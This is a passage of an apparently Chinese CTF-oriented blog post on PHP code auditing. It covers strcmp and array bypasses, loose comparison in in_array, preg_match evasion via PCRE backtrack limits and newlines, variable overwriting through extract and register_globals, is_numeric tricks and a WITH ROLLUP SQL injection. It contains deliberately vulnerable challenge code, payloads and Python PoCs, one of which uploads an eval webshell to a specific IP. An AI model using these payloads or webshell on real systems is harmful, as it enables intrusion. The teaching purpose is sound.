if (strcmp($_POST[&#39;password&#39;], $password) == 0) &#123;
        echo &quot;Right!!!login success&quot;;
        exit();     
&#125; else &#123; 
    echo &quot;Wrong password..&quot;;      
&#125;?&gt;
</code></pre>
<p>在这个题目中我们需要自己输入一个password的值和$password相比较但是我们不知道这个password的值，有可能时字符串有可能时数字，这个时候怎末办呢，依然时相同的绕过姿势，试一试数组绕过假设如果传入一个数组会怎末样呢？我们传入password[]=xxx ，绕过成功。<br>原理是因为函数接受到了不符合的类型，将发生错误，函数返回值为0，所以判断相等。<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664115029345-c4396917-332e-43ca-8625-e84c1f5fe398.png" alt="image.png"></p>
<h3 id="array-search（）、in-array-绕过"><a href="#array-search（）、in-array-绕过" class="headerlink" title="array_search（）、in_array()绕过"></a>array_search（）、in_array()绕过</h3><pre><code class="php">mixed array_search ( mixed $needle , array $haystack [, bool $strict = false ] ) 
</code></pre>
<p> array_search() 函数在数组中搜索某个键值，并返回对应的键名。<br>in_array() 函数搜索数组中是否存在指定的值。<br>基本功能是相同的，也就是说绕过姿势也相同。Array系列有两种安全问题，一种是正常的数组绕过，一种是<br>“= =”号问题。先讲第一个数组绕过。<br>如果两个函数的第三个参数为true那么下列方法就无效了<br> needle，haystack必需，strict可选 函数判断haystack中的值是存在needle，存在则返回该值的键值 第三个参数默认为false，如果设置为true则会进行严格过滤  </p>
<h4 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h4><pre><code class="php">&lt;?php
if(!is_array($_GET[&#39;test&#39;]))&#123;
    exit();&#125;
$test=$_GET[&#39;test&#39;];
for($i=0;$i&lt;count($test);$i++)&#123;
    if($test[$i]===&quot;admin&quot;)&#123;
        echo &quot;error&quot;;
        exit();
    &#125;
    $test[$i]=intval($test[$i]);
&#125;
if(array_search(&quot;admin&quot;,$test)===0)&#123;
    echo &quot;flag&quot;;
&#125;
else&#123;
    echo &quot;false&quot;;
&#125;
?&gt;
</code></pre>
<p> 先判断是不是数组，然后在把数组中的内容一个个进行遍历，所有内容都不能等于admin,类型也必须相同，然后转化成int型，然后再进行比较如果填入值与admin相同，则返回flag,如何绕过呢？<br> 基本思路还是不变，因为用的是三个等于号，所以说“= =”号这个方法基本不能用，那就用第二条思路，利用函数接入到了不符合的类型返回“0”这个特性，直接绕过检测。这里的重点是intval函数，将数组里的数转换为了int类型，当”admin”这个字符串和数组的数据比较时会变为0，所以payload：test[]=0。  同理，因为intval将数组里的数转换为了int类型，所以我们传入一个字符串还是会变为0，最终效果和直接传入0是一样的。<br>payload：test[]=xxxxx<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664122013954-962e04ee-e03f-49b3-afbb-ae3cc4b1b61c.png" alt="image.png"></p>
<h4 id="问题"><a href="#问题" class="headerlink" title="==问题"></a>==问题</h4><p>在PHP手册中，in_array()函数的解释是bool in_array ( mixed needle,arrayhaystack [, bool strict=FALSE]),如果strict参数没有提供或者是false(true会进行严格的过滤)，那么inarray就会使用松散比较来判断needle是否在$haystack中。当strince的值为true时，in_array()会比较needls的类型和haystack中的类型是否相同<br>参考例子:</p>
<pre><code class="php">&lt;?php
$array=[0,1,2,&#39;3&#39;];
var_dump(in_array(&#39;abc&#39;, $array));  //true
var_dump(in_array(&#39;1bc&#39;, $array));  //true
</code></pre>
<p>通过例子我们就知道了，这个松散的判断就是等于号，所以出现了“= =”号的特性“abc”==0、“1bc”==1，如果不加true的话就可以利用“= =”轻松绕过。array_search同理</p>
<h2 id="preg-match绕过"><a href="#preg-match绕过" class="headerlink" title="preg_match绕过"></a>preg_match绕过</h2><p><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664203268848-481347db-314f-49d6-8d10-90798407e863.png" alt="1270588-20200115184356475-448487219.png"><br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664203281706-4da909d4-bb4a-4c22-a766-b765b4620ef2.png" alt="1270588-20200115184407398-525177328.png"><br><strong>绕过方法：</strong></p>
<h3 id="数组绕过-1"><a href="#数组绕过-1" class="headerlink" title="数组绕过"></a>数组绕过</h3><p> preg_match只能处理字符串，当传入的subject是数组时会返回false  </p>
<pre><code class="php">&lt;?php
//模式分隔符后的&quot;i&quot;标记这是一个大小写不敏感的搜索
show_source(__FILE__);
$a = $_GET[&#39;x&#39;];
if (preg_match(&quot;/php/i&quot;, $a)) &#123;
    echo &quot;查找到匹配的字符串 php。&quot;;
&#125; else &#123;
    echo &quot;未发现匹配的字符串 php。&quot;;
&#125;
?&gt;
</code></pre>
<p><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664205498275-3b5e7f1d-dbd6-4b3b-962d-2ff47b09c215.png" alt="image.png"><br>此时我们传入的数组中有flag，但是并没有检测到</p>
<h3 id="PCRE回溯次数限制"><a href="#PCRE回溯次数限制" class="headerlink" title="PCRE回溯次数限制"></a>PCRE回溯次数限制</h3><p>题目:pcrewaf</p>
<pre><code class="php">&lt;?php
function is_php($data)&#123;
    return preg_match(&#39;/&lt;\?.*[(`;?&gt;].*/is&#39;, $data);
&#125;

if(empty($_FILES)) &#123;
    die(show_source(__FILE__));
&#125;

$user_dir = &#39;data/&#39; . md5($_SERVER[&#39;REMOTE_ADDR&#39;]);
$data = file_get_contents($_FILES[&#39;file&#39;][&#39;tmp_name&#39;]);
if (is_php($data)) &#123;
    echo &quot;bad request&quot;;
&#125; else &#123;
    @mkdir($user_dir, 0755);
    $path = $user_dir . &#39;/&#39; . random_int(0, 10) . &#39;.php&#39;;
    move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], $path);

    header(&quot;Location: $path&quot;, true, 303);
&#125;
</code></pre>
<p> 大意是判断一下用户输入的内容有没有PHP代码，如果没有，则写入文件。这种时候，如何绕过is_php()函数来写入webshell呢？<br> PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限pcre.backtrack_limit，默认为1000000，如果回溯次数超过这个数字，preg_match会返回false<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664206312119-a1275f6a-f3b0-4d55-bd36-d6aa1f4558b5.png" alt="image.png"><br> 我们通过发送超长字符串的方式，使正则执行失败，最后绕过目标对PHP语言的限制。<br>poc:</p>
<pre><code class="python">import requests
from io import BytesIO

files = &#123;
  &#39;file&#39;: BytesIO(b&#39;aaa&lt;?php eval($_POST[txt]);//&#39; + b&#39;a&#39; * 1000000)
&#125;

res = requests.post(&#39;http://51.158.75.42:8088/index.php&#39;, files=files, allow_redirects=False)
print(res.headers)
</code></pre>
<p>题目二:</p>
<pre><code class="php">&lt;?php
show_source(__FILE__);
function areyouok($greeting)&#123;
    return preg_match(&#39;/Merry.*Christmas/is&#39;,$greeting);
&#125;

$greeting=@$_POST[&#39;greeting&#39;];

if(!is_array($greeting))&#123;
    if(!areyouok($greeting))&#123;
    if(strpos($greeting,&#39;Merry Christmas&#39;)!==false)&#123;
        echo &#39;Merry Christmas. &#39;.&#39;flag&#123;This_is_F1ag&#125;&#39;;
    &#125;else&#123;
        echo &#39;Do you know .swp file?&#39;;
    &#125;
    &#125;else&#123;
        echo &#39;Do you know PHP?&#39;;
&#125;
&#125;
?&gt;
</code></pre>
<p>poc:</p>
<pre><code class="php">import requests

url = &quot;http://127.0.0.1/test.php&quot;;
data = &#123;
    &quot;greeting&quot;: &quot;Merry Christmas&quot;+&quot;aaaaa&quot;*10000000
&#125;
res = requests.post(url=url, data=data,allow_redirects=False)
print(res.text)
</code></pre>
<p><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664210591824-00db5293-f384-4d9d-a2d9-615665f42f07.png" alt="image.png"><br>ps:以上对php7不生效</p>
<h3 id="换行符"><a href="#换行符" class="headerlink" title="换行符"></a>换行符</h3><p><strong>.不会匹配换行符</strong></p>
<pre><code class="php">&lt;?php
show_source(__FILE__);
header(&quot;content-type:text/html; charset=utf-8&quot;);
$json  = $_POST[&#39;x&#39;];
if (preg_match(&#39;/^.*(flag).*$/&#39;, $json)) &#123;
    echo &#39;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#39;;
&#125;else&#123;
    $a = str_replace(&quot;\n&quot;,&quot;&quot;,$json);
    if (strpos($a,&quot;flag&quot;)!=false)&#123;
        echo &quot;flag&#123;xxxxx&#125;&quot;;
    &#125;
&#125;
</code></pre>
<p>这段代码的意思就是传入的值中不能被preg_match匹配到flag，但是又要存在flag才能获得flag。这里有个关键点，如何只传入\nflag是不行的，因为这样strpos会返回0，相当于false<br>poc:</p>
<pre><code class="php">import requests

url = &quot;http://127.0.0.1/test.php&quot;;
data = &#123;
    &quot;x&quot;: &quot;\naaflag&quot;
&#125;
res = requests.post(url=url, data=data,allow_redirects=False)
print(res.text)
</code></pre>
<p><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664212236037-404ab3ea-6564-4da3-a8a5-2b9bac5238ed.png" alt="image.png"><br>** 而在非多行模式下，$似乎会忽略在句尾的%0a**</p>
<pre><code class="php">if (preg_match(&#39;/^flag$/&#39;, $_GET[&#39;a&#39;]) &amp;&amp; $_GET[&#39;a&#39;] !== &#39;flag&#39;) &#123;
    echo $flag;
&#125;
</code></pre>
<p>?a=flag%0a</p>
<h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><h3 id="extract变量覆盖"><a href="#extract变量覆盖" class="headerlink" title="extract变量覆盖"></a>extract变量覆盖</h3><p><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664372322802-2f037800-d395-497b-936c-9e5f3803a2f7.png" alt="image.png"><br>使用例子:</p>
<pre><code class="php">&lt;?php
$a = &quot;Original&quot;;
$my_array = array(&quot;a&quot; =&gt; &quot;Cat&quot;,&quot;b&quot; =&gt; &quot;Dog&quot;, &quot;c&quot; =&gt; &quot;Horse&quot;);
extract($my_array);
echo &quot;\$a = $a; \$b = $b; \$c = $c&quot;;
?&gt;
</code></pre>
<p><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664372356449-4949468c-f9f2-4372-af01-87d214424592.png" alt="image.png"><br>ctf题目:</p>
<pre><code class="php">&lt;?php
highlight_file(__FILE__);
$flag = &quot;E:\\phpstudy_pro\\WWW\\flag.txt&quot;;
extract($_GET);
if (isset($HY))&#123;
    $content = trim(file_get_contents($flag));
    if ($HY == $content)&#123;
        echo file_get_contents(&quot;E:\\phpstudy_pro\\WWW\\flag.txt&quot;);
    &#125;else&#123;
        echo &#39;Oh,no&#39;;
    &#125;
&#125;
</code></pre>
<p>payload:</p>
<pre><code class="php">http://127.0.0.1/test.php?HY=&amp;flag=  //传入HY和flag空值，
//extract接受了一个数组，分别赋值造成覆盖
</code></pre>
<p>问题:这里为什么不能给HY和flag分别传入1<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664381662252-e858b918-d47d-4ef3-9619-89d9622fa466.png" alt="image.png"><br>传入两个1后，$HY和$flag都为1，进入if语句，file_get_content(1)，返回为空，但是此时$HY=1，就不相等了，所以同理可以构造多种payload的</p>
<pre><code class="php">http://127.0.0.1/test.php?HY=&amp;flag=aaa
</code></pre>
<h3 id="parse-str"><a href="#parse-str" class="headerlink" title="parse_str()"></a>parse_str()</h3><p> 解析字符串并注册成变量  </p>
<pre><code class="php">$b=1;
Parse_str(&#39;b=2&#39;);
Print_r($b);
</code></pre>
<p><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664383931472-7c2603eb-5da6-493d-961a-0cef9d6aed2c.png" alt="image.png"></p>
<h3 id="import-request-variables"><a href="#import-request-variables" class="headerlink" title="import_request_variables()"></a>import_request_variables()</h3><p> 将 GET/POST/Cookie 变量导入到全局作用域中，全局变量注册。<br>在5.4之后被取消，只可在4-4.1.0和5-5.4.0可用。  </p>
<pre><code class="php">//导入POST提交的变量值，前缀为post_
import_request_variable(&quot;p&quot;， &quot;post_&quot;);
//导入GET和POST提交的变量值，前缀为gp_，GET优先于POST
import_request_variable(&quot;gp&quot;， &quot;gp_&quot;);
//导入Cookie和GET的变量值，Cookie变量值优先于GET
import_request_variable(&quot;cg&quot;， &quot;cg_&quot;);
</code></pre>
<h3 id="变量覆盖-1"><a href="#变量覆盖-1" class="headerlink" title="$$变量覆盖"></a>$$变量覆盖</h3><p> 提交参数chs，则可覆盖变量”$chs”的值。$key为chs时，$$key就变成$chs  </p>
<pre><code class="php">&lt;?  
$chs = &#39;&#39;;  
if($_POST &amp;&amp; $charset != &#39;utf-8&#39;)&#123;  
    $chs = new Chinese(&#39;UTF-8&#39;, $charset);  
    foreach($_POST as $key =&gt; $value)&#123;  
        $$key = $chs-&gt;Convert($value);  
    &#125;  
    unset($chs);  
&#125; 
</code></pre>
<h3 id="register-globals全局变量覆盖"><a href="#register-globals全局变量覆盖" class="headerlink" title="register_globals全局变量覆盖"></a>register_globals全局变量覆盖</h3><p> php.ini中有一项为register_globals，即注册全局变量，当register_globals=On时，传递过来的值会被直接的注册为全局变量直接使用，而register_globals=Off时，我们需要到特定的数组里去得到它。<br> 注意：register_globals已自 PHP 5.3.0 起废弃并将自 PHP 5.4.0 起移除  </p>
<p>当register_global=ON时，变量来源可能是各个不同的地方，比如页面的表单，Cookie等</p>
<pre><code class="php">&lt;?php
echo &quot;Register_globals: &quot;.(int)ini_get(&quot;register_globals&quot;).&quot;&lt;br/&gt;&quot;;

if ($auth)&#123;
   echo &quot;private!&quot;;
&#125;
?&gt;
</code></pre>
<p>当register_globals=OFF时，这段代码不会出问题。<br>但是当register_globals=ON时，提交请求URL：<a target="_blank" rel="noopener" href="http://www.a.com/test.php?auth=1,%E5%8F%98%E9%87%8F$auth%E5%B0%86%E8%87%AA%E5%8A%A8%E5%BE%97%E5%88%B0%E8%B5%8B%E5%80%BC%E3%80%82%E5%BE%97%E5%88%B0%E7%9A%84%E7%BB%93%E6%9E%9C%E4%B8%BA">http://www.a.com/test.php?auth=1,变量$auth将自动得到赋值。得到的结果为</a><br>Register_globals:1<br>private!<br><em>小记：如果上面的代码中，已经对变量$auth赋了初始值，比如$auth=0，那么即使在URL中有/test.php?auth=1，也不会将变量覆盖，也就是说不会打印出private！</em><br>利用：<br>通过$GLOBALS获取的变量，也可能导致变量覆盖。</p>
<pre><code class="php">&lt;?php
echo &quot;Register_globals:&quot;.(int)ini_get(&quot;register_globals&quot;).&quot;&lt;br/&gt;&quot;;
if (ini_get(&#39;register_globals&#39;)) foreach($_REQUEST as $k=&gt;$v) unset($&#123;$k&#125;);
print $a;
print $_GET[b];
?&gt;
</code></pre>
<p>变量$a未初始化，在register_globals=ON时，再尝试控制“$a”的值（<a target="_blank" rel="noopener" href="http://www.a.com/test1.php?a=1&amp;b=2%EF%BC%89%EF%BC%8C%E4%BC%9A%E5%9B%A0%E4%B8%BA%E8%BF%99%E6%AE%B5%E4%BB%A3%E7%A0%81%E8%80%8C%E5%87%BA%E9%94%99%E3%80%82">http://www.a.com/test1.php?a=1&amp;b=2），会因为这段代码而出错。</a><br>而当尝试注入“GLOBALS[a]”以覆盖全局变量时（<a target="_blank" rel="noopener" href="http://www.a.com/test1.php?GLOBALS%5Ba%5D=1&amp;b=2%EF%BC%89%EF%BC%8C%E5%88%99%E5%8F%AF%E4%BB%A5%E6%88%90%E5%8A%9F%E6%8E%A7%E5%88%B6%E5%8F%98%E9%87%8F%E2%80%9C$a%E2%80%9D%E7%9A%84%E5%80%BC%E3%80%82%E8%BF%99%E6%98%AF%E5%9B%A0%E4%B8%BAunset()%E9%BB%98%E8%AE%A4%E5%8F%AA%E4%BC%9A%E9%94%80%E6%AF%81%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%EF%BC%8C%E8%A6%81%E9%94%80%E6%AF%81%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E5%BF%85%E9%A1%BB%E4%BD%BF%E7%94%A8$GLOBALS%E3%80%82">http://www.a.com/test1.php?GLOBALS[a]=1&amp;b=2），则可以成功控制变量“$a”的值。这是因为unset()默认只会销毁局部变量，要销毁全局变量必须使用$GLOBALS。</a><br><strong>而在register_globals=OFF时，则无法覆盖到全局变量。</strong><br><em>小记：register_globals的意思是注册为全局变量，所以当On的时候，传递过来的值会被直接注册为全局变量而直接使用，当为OFF的时候，就需要到特定的数组中去得到它。unset用于释放给定的变量</em></p>
<h2 id="is-numeric-绕过"><a href="#is-numeric-绕过" class="headerlink" title="is_numeric()绕过"></a>is_numeric()绕过</h2><p> [极客大挑战 2019]BuyFlag  </p>
<pre><code class="php">if (is_numeric($password)) &#123;
        echo &quot;password can&#39;t be number&lt;/br&gt;&quot;;
    &#125;elseif ($password == 404) &#123;
        echo &quot;Password Right!&lt;/br&gt;&quot;;
    &#125;
</code></pre>
<p> 密码是404，但是不能输入数字<br> 可以借助url编码中的空字符，例如%00或者%20，其中%00加在数值前面或者后面都可以，也就是%00404或者404%00这样，将%20加在数值末尾也可以绕过，比如404%20。<br>payload:</p>
<pre><code class="php">数字-&gt;非数字：
404%00
404%20
404,
404&#39;
</code></pre>
<p><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664439276748-c113f1e6-863f-4757-b928-fad0595e01cd.png" alt="image.png"></p>
<h2 id="绕过过滤的空白字符"><a href="#绕过过滤的空白字符" class="headerlink" title="绕过过滤的空白字符"></a>绕过过滤的空白字符</h2><pre><code class="php">&lt;?php
header(&quot;content-type:text/html; charset=utf-8&quot;);
highlight_file(__FILE__);
$info = &quot;&quot;;
$req = [];
$flag=&quot;flag&#123;this_is_flag&#125;&quot;;

ini_set(&quot;display_error&quot;, false); //为一个配置选项设置值
error_reporting(0); //关闭所有PHP错误报告

if(!isset($_GET[&#39;number&#39;]))&#123;
    header(&quot;hint:26966dc52e85af40f59b4fe73d8c323a.txt&quot;); //HTTP头显示hint 26966dc52e85af40f59b4fe73d8c323a.txt

    die(&quot;have a fun!!&quot;); //die — 等同于 exit()

&#125;

foreach([$_GET, $_POST] as $global_var) &#123;  //foreach 语法结构提供了遍历数组的简单方式
    foreach($global_var as $key =&gt; $value) &#123;
        $value = trim($value);  //trim — 去除字符串首尾处的空白字符（或者其他字符）
        is_string($value) &amp;&amp; $req[$key] = addslashes($value); // is_string — 检测变量是否是字符串，addslashes — 使用反斜线引用字符串
    &#125;
&#125;


function is_palindrome_number($number) &#123;
    $number = strval($number); //strval — 获取变量的字符串值
    $i = 0;
    $j = strlen($number) - 1; //strlen — 获取字符串长度
    while($i &lt; $j) &#123;
        if($number[$i] !== $number[$j]) &#123;
            return false;
        &#125;
        $i++;
        $j--;
    &#125;
    return true;
&#125;


if(is_numeric($_REQUEST[&#39;number&#39;])) //is_numeric — 检测变量是否为数字或数字字符串
&#123;

    $info=&quot;sorry, you cann&#39;t input a number!&quot;;

&#125;
elseif($req[&#39;number&#39;]!=strval(intval($req[&#39;number&#39;]))) //intval — 获取变量的整数值
&#123;

    $info = &quot;number must be equal to it&#39;s integer!! &quot;;

&#125;
else
&#123;

    $value1 = intval($req[&quot;number&quot;]);
    $value2 = intval(strrev($req[&quot;number&quot;]));

    if($value1!=$value2)&#123;
        $info=&quot;no, this is not a palindrome number!&quot;;
    &#125;
    else
    &#123;

        if(is_palindrome_number($req[&quot;number&quot;]))&#123;
            $info = &quot;nice! &#123;$value1&#125; is a palindrome number!&quot;;
        &#125;
        else
        &#123;
            $info=$flag;
        &#125;
    &#125;

&#125;

echo $info;
</code></pre>
<p>需要满足条件:<br>1.条件is_numeric($_REQUEST[‘number’])为假，这个绕过的方法很多使用%00开头也可以再POST一个number参数把GET中的覆盖掉也可以，所以这一步很简单。<br>2.要求 $req[‘number’]==strval(intval($req[‘number’]))<br>3.要求intval($req[‘number’]) == intval(strrev($req[‘number’]))<br>4.is_palindrome_number()返回False，这个条件只要在一个回文数比如191前面加一个字符即可实现<br>得到flag 看上述条件，条件4需要加字符但是加了之后需要满足2,3这两个条件所以就可以在原题目中简化出2,3,4来进行Fuzzing，简化后后端代码如下：</p>
<pre><code class="php">&lt;?php
function is_palindrome_number($number) &#123;
    $number = strval($number); //strval — 获取变量的字符串值
    $i = 0;
    $j = strlen($number) - 1; //strlen — 获取字符串长度
    while($i &lt; $j) &#123;
        if($number[$i] !== $number[$j]) &#123;
            return false;
        &#125;
        $i++;
        $j--;
    &#125;
    return true;
&#125;
$a = trim($_GET[&#39;number&#39;]);
if ((($a==strval(intval($a)))&amp;(intval($a)==intval(strrev($a)))&amp;!is_palindrome_number($a))==1):
    print &quot;ok&quot;;
else:
    print &quot;no&quot;;
endif;
</code></pre>
<p>poc:</p>
<pre><code class="php">import requests
for i in range(256):
    rq = requests.get(&quot;http://127.0.0.1/test3.php?number=%s191&quot;%(&quot;%%%02X&quot;%i))
    if &#39;ok&#39; in rq.text:
        print (&quot;%%%02X&quot;%i)
</code></pre>
<p>%%%02X这里解释一下:<br>首先分开看  %% 和 %02X 两部分<br>%%第一个为转义的意思，所以这两个一起的意思就是 %<br>%02x  ：%x是把数字输出为16进制的格式，%02x是保证输出至少占两个字符的位置,如果不够两位的话前面补0<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664527433234-991a8002-e11a-4eb8-b6db-ad7f98a1924f.png" alt="image.png"><br>所以可知最终payload有:</p>
<pre><code class="php">%00%0C404
%0C404%00
%00%2B404
%2B404%00
%0C404%20
</code></pre>
<p><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664528429736-e234f081-4e74-4e7f-b76c-2717f2d36a86.png" alt="image.png"></p>
<h2 id="多重加密"><a href="#多重加密" class="headerlink" title="多重加密"></a>多重加密</h2><pre><code class="php">&lt;?php
$login = unserialize(gzuncompress(base64_decode($requset[&#39;token&#39;])));
if($login[&#39;user&#39;] === &#39;ichunqiu&#39;)&#123;echo $flag;&#125;    
?&gt;
</code></pre>
<p>本地:</p>
<pre><code class="php">&lt;?php
$arr = array([&#39;user&#39;] === &#39;ichunqiu&#39;);
$token = base64_encode(gzcompress(serialize($arr)));
print_r($token);
// 得到eJxLtDK0qs60MrBOAuJaAB5uBBQ=
?&gt;
</code></pre>
<h2 id="SQL注入-WITH-ROLLUP绕过"><a href="#SQL注入-WITH-ROLLUP绕过" class="headerlink" title="SQL注入_WITH ROLLUP绕过"></a>SQL注入_WITH ROLLUP绕过</h2><p>当遇到报错:<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664545321688-c300c5e7-4b73-4e82-abe0-07cc279954bc.png" alt="image.png"><br>MySQL 5.7.5以上版本，实现了对功能依赖的检测。如果启用了only_full_group_by SQL模式(默认启用)，那么MySQL就会拒绝执行 select list、HAVING condition或ORDER BY list引用既不在GROUP BY子句中被命名，也不在功能上依赖于GROUP BY列（由GROUP BY列唯一确定）的未聚合列的查询。<br>从MySQL5.7.5开始，默认的SQL模式包括only_full_group_by。（在5.7.5之前，MySQL没有检测到功能依赖项，only_full_group_by在默认情况下是不启用的。关于前5.7.5行为的描述，请参阅MySQL 5.6参考手册。)<br>解决方法(暂时):</p>
<pre><code class="php">SET sql_mode =&#39;STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_ENGINE_SUBSTITUTION&#39;;
</code></pre>
<p>或者在my.ini中追加:</p>
<pre><code class="php">sql-mode=STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION
</code></pre>
<p>题目:</p>
<pre><code class="php">&lt;?php
error_reporting(0);
header(&quot;Content-Type:text/html;charset=utf-8&quot;);
if (!isset($_POST[&#39;username&#39;]) || !isset($_POST[&#39;password&#39;])) &#123;
    echo &#39;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&#39;.&quot;&lt;br/&gt;&quot;;
    echo &#39;&lt;input name=&quot;username&quot; type=&quot;text&quot;/&gt;&#39;.&quot;&lt;br/&gt;&quot;;
    echo &#39;&lt;input name=&quot;password&quot; type=&quot;text&quot;/&gt;&#39;.&quot;&lt;br/&gt;&quot;;
    echo &#39;&lt;input type=&quot;submit&quot; /&gt;&#39;.&quot;&lt;br/&gt;&quot;;
    echo &#39;&lt;/form&gt;&#39;.&quot;&lt;br/&gt;&quot;;
    echo &#39;&lt;!--source: source.txt--&gt;&#39;.&quot;&lt;br/&gt;&quot;;
    die;
&#125;

function AttackFilter($StrKey,$StrValue,$ArrReq)&#123;
    if (is_array($StrValue))&#123;

//检测变量是否是数组

        $StrValue=implode($StrValue);

//返回由数组元素组合成的字符串

    &#125;
    if (preg_match(&quot;/&quot;.$ArrReq.&quot;/is&quot;,$StrValue)==1)&#123;

//匹配成功一次后就会停止匹配

        print &quot;水可载舟，亦可赛艇！&quot;;
        exit();
    &#125;
&#125;

$filter = &quot;and|select|from|where|union|join|sleep|benchmark|,|\(|\)&quot;;
foreach($_POST as $key=&gt;$value)&#123;

//遍历数组

    AttackFilter($key,$value,$filter);
&#125;

$con = mysql_connect(&quot;127.0.1.1:3306&quot;,&quot;root&quot;,&quot;root&quot;);
if (!$con)&#123;
    die(&#39;Could not connect: &#39; . mysql_error());
&#125;
$db=&quot;test&quot;;
mysql_select_db($db, $con);

//设置活动的 MySQL 数据库

$sql=&quot;SELECT * FROM users WHERE username = &#39;&#123;$_POST[&#39;username&#39;]&#125;&#39;&quot;;
$query = mysql_query($sql);

//执行一条 MySQL 查询

if (mysql_num_rows($query) == 1) &#123;

//返回结果集中行的数目

    $key = mysql_fetch_array($query);

//返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false

    if($key[&#39;password&#39;] == $_POST[&#39;password&#39;]) &#123;
        print &quot;CTF&#123;You_ArE_sUUccesS!&#125;&quot;;
    &#125;else&#123;
        print &quot;亦可赛艇！&quot;;
    &#125;
&#125;else&#123;
    print &quot;一颗赛艇！&quot;;
    print $sql;
    print $query;
&#125;
mysql_close($con);
?&gt;
</code></pre>
<p>自己修改配置，连接上数据库.<br>关于WITH ROLLUP绕过我们来看一些例子<br>数据库基本信息:<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664799167791-f73d8cad-de15-4ed1-b759-6e60ac3bdc7c.png" alt="image.png"><br>使用with rollup语句( 分组后会在多一行统计  )<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664799401626-0548b90c-ae44-4931-a58c-0e30f530b0c8.png" alt="image.png"><br>多了一行，id为空，我们搭配limit语句<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664799686573-6baf3c8d-5153-405e-9a3f-8c8e34cd9159.png" alt="image.png"><br>那如果我们用password分组呢<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664799734140-1e13868d-1733-49ef-a0dc-2cc6720027e7.png" alt="image.png"><br>现在的password为NULL,查询出的白居易是没密码的<br>但是这里的代码中 ,是被过滤的，那么我们可以搭配offset去查询<br>关于他们两个的用法:<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664800909937-c4f07ca9-ac72-453d-99a1-47596c230bf8.png" alt="image.png"><br>所以我们就可以构造语句:<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664800950046-ac038845-128e-47b6-b80b-2f11f8e05b7a.png" alt="image.png"><br>所以当我们知道用户名的时候，就可以构造sql语句进行绕过，此时password就为NULL<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664804646068-df9eb134-ecf7-4a47-8e40-15d1530d0d45.png" alt="image.png"><br>构造payload:</p>
<pre><code class="php">username=白居易&#39; GROUP BY password WITH ROLLUP LIMIT 1 OFFSET 1#&amp;password=
</code></pre>
<p><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664805775369-dcc55dfe-2e38-405e-a694-f4dc4ac7eb03.png" alt="image.png"></p>
<h2 id="ereg正则-00截断"><a href="#ereg正则-00截断" class="headerlink" title="ereg正则%00截断"></a>ereg正则%00截断</h2><p>代码:</p>
<pre><code class="php">&lt;?php

highlight_file(__FILE__);
header(&quot;Content-Type:text/html;charset=utf-8&quot;);

